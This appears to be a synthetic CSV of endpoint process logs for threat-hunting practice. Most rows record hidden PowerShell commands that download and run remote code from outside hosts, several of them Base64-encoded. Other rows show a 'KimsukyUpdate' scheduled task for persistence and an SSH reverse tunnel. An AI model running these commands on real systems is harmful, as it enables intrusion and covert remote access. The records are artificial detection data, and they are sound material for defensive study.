Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,ProcessCommandLine,ProcessId,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-03-24T17:54:18.000Z,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-WS-002,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwAxADkAMwAuADEANAAyAC4AMQA0ADYALgAzADUALwBsAGQAcgApAA==,9368,explorer.exe,9191,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ptaylor,CORP,S-1-5-21-3456789012-1234567890-987654321-1009,1851d1cf1dabb10abd10f87c6d0e0597
2026-03-24T17:56:18.000Z,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-WS-002,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a,"schtasks.exe /create /tn ""KimsukyUpdate"" /tr ""wscript.exe C:\Users\Public\upd.vbs"" /sc minute /mo 19 /f",9452,powershell.exe,9368,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwAxADkAMwAuADEANAAyAC4AMQA0ADYALgAzADUALwBsAGQAcgApAA==,explorer.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,ptaylor,CORP,S-1-5-21-3456789012-1234567890-987654321-1009,ee22a70b1ee932603002d8313227e8d8
2026-03-25T17:44:50.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://91.92.240.13/kimsuky/ldr')""",9587,explorer.exe,9531,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,eanderson,CORP,S-1-5-21-3456789012-1234567890-987654321-1010,d06405a85bd29cb108453b2f8a8a4105
2026-03-25T17:46:50.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a,"schtasks.exe /create /tn ""KimsukyUpdate"" /tr ""wscript.exe C:\Users\Public\upd.vbs"" /sc minute /mo 19 /f",9783,powershell.exe,9587,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://91.92.240.13/kimsuky/ldr')""",explorer.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,eanderson,CORP,S-1-5-21-3456789012-1234567890-987654321-1010,3a46fbe3d255a4de9330ba8312087e20
2026-03-26T20:27:10.000Z,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-004,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -W Hidden -NoP -Ep Bypass -c ""iex(iwr https://muddywater-c2.icu/payload)""",9872,explorer.exe,9788,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ldavis,CORP,S-1-5-21-3456789012-1234567890-987654321-1005,b652ae9938b5e89ac921057c3f05557c
2026-03-27T19:51:30.000Z,e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-001,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -WindowStyle Hidden -c ""IEX(irm 'https://185.234.247.12/mw/ldr')""",10173,explorer.exe,10072,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,rthomas,CORP,S-1-5-21-3456789012-1234567890-987654321-1006,bdcbfffccdfba4e996cbdafb59bb8900
2026-03-28T21:23:39.000Z,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,CORP-LT-002,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,powershell.exe -EncodedCommand aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQA4ADUALgAyADMANAAuADIANAA3AC4AMQAyAC8AbQB3ACcAKQA=,10387,explorer.exe,10257,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,e5a1c6e4e1886146fc40a3d4e5eb4549
2026-03-29T21:18:30.000Z,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-006,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://filefix-cdn.shop/fix.ps1)""",10533,explorer.exe,10527,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ptaylor,CORP,S-1-5-21-3456789012-1234567890-987654321-1009,f26bcebf7def3b8eec0dfc3ab011b125
2026-03-30T22:12:06.000Z,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-004,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -ep bypass -w hidden -c ""irm https://91.242.33.14/ff | iex""",10695,explorer.exe,10545,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,eanderson,CORP,S-1-5-21-3456789012-1234567890-987654321-1010,a86d8706637b3648d617b9c0a449d64f
2026-03-20T21:18:00.000Z,e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,CORP-WS-007,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -W Hidden -NoP -c ""ssh -o StrictHostKeyChecking=no -R 8080:localhost:80 tunnel@91.242.33.14 -N -f""",37016,explorer.exe,24980,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,oivanov,CORP,S-1-5-21-3456789012-1234567890-987654321-1011,3230a5399ec950b7111df1d69a80af6c
2026-03-21T18:30:23.000Z,f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,CORP-WS-008,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -WindowStyle Hidden -c ""iex(iwr 'https://185.220.101.45/apt28/ldr')""",56975,explorer.exe,38696,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,pkovalev,CORP,S-1-5-21-3456789012-1234567890-987654321-1012,f73607bcaeab862e63c8cd529efb271d
2026-03-22T20:17:48.000Z,a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,CORP-LT-005,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,powershell.exe -EncodedCommand cwBzAGgAIAAtAG8AIABTAHQAcgBpAGMAdABIAG8AcwB0AEsAZQB5AEMAaABlAGMAawBpAG4AZwA9AG4AbwAgAC0AUgAgADgAMAA4ADAAOgBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAAgAHQAdQBuAG4AZQBsAEAAOQAxAC4AMgA0ADIALgAzADMALgAxADQA,11651,explorer.exe,5620,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ssokolov,CORP,S-1-5-21-3456789012-1234567890-987654321-1013,a7000db3a6fd7f26039dcfb2b743416c
2026-03-19T12:09:28.000Z,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-LT-003,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -W Hidden -c ""Get-WindowsUpdate -Install -AcceptAll""",10710,explorer.exe,10773,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,27ef0a4b5fb2b838af73b3cf331e91f2
2026-03-01T09:26:15.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,f43d9bb316e30ae1a3494ac5b0624f6bea1bf054,"powershell.exe -NonInteractive -c ""gpupdate /force""",10923,explorer.exe,10966,explorer.exe,userinit.exe,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,abrown,CORP,S-1-5-21-3456789012-1234567890-987654321-1003,e8e46b314ff85111f8751fd46d2ccf42
